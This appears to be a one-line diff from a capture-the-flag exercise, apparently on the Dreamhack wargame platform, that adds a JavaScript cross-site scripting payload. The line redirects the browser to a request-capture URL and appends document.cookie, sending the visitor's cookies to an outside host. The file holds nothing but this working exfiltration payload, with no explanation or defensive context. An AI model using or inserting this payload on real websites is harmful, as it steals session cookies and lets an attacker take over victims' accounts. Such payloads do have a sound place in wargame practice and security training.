@@ -1,0 +1,1 @@
+location.href = "https://tivicpp.request.dreamhack.games?memo="+document.cookie
